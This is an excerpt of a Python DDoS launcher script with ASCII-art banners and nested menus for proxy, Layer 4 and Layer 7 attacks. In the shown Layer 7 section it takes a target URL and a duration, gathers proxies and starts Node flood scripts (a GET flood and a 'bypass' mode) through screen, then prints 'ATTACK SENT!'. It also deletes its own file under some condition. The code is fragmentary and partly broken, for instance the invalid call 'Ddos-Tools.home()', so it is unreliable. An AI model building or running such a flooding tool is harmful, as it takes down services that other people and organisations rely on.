...
class Home:
	...
	def home(self): # don't edit this banner lol
      ...
      {Color.LG} ░░░██║░░░╚█████╔╝╚█████╔╝███████╗
	  {Color.LC} ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝
    {Color.LR}[{Color.LG}>     Made with By Philippines alliance  {Color.LG}<{Color.LR}]""")
		...
		while True:
			try:
				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"ddostool"+Color.LB+"@"+Color.LG+"Home"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
				option = input()
				if option in ['01', '1']:
					os.system('clear')
					Tool.proxy(option)
					...
					subprocess.run(['pkill -f Ddos-Tool.py'], shell=True)
...
""")
		...
		print("\n")
		while True:
				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"ddostool"+Color.LB+"@"+Color.LG+"Proxy"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
				option = input()
				if option in ['01', '1']:
...
""")
		...
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"ddostool"+Color.LB+"@"+Color.LG+"Webtool"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				while True:
	...
	def bbos(self):
		...
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"ddostool"+Color.LB+"@"+Color.LG+"L4/L7/BBoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
...
""")
		...
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"ddostool"+Color.LB+"@"+Color.LG+"Layer4"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['01', '1']:
				try:
		...
		while True:
			...
			if option in ['01', '1']:
				...
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					DdosTool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
					print(Color.LG+f"\n [!] ATTACK SENT!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['02', '3']:
				try:
					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
					DdosTool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
					print(Color.LG+f"\n [!] ATTACK SENT!\n")
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option in ['04', '4']:
...
def main():
	...
	try:
		...
		print("\n[+] Please download on GitHub, or git clone: empty\n")
		os.remove(f'{__file__}')
		script = False
	if script == False:sys.exit()
	else:Ddos-Tools.home()
...
{Color.LC}DEV{Color.LR} ~> {Color.LY}Contact/Support dev"""
	dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY}Uknown
{Color.LC}Momo{Color.LR}: {Color.LY}Uknown"""
	DdosTools = Home(commands, dev)
	Tool = Tool(commands, dev, spoof_useragents())
	try:open('Ddos-Tool.py');main()
	except:quit()
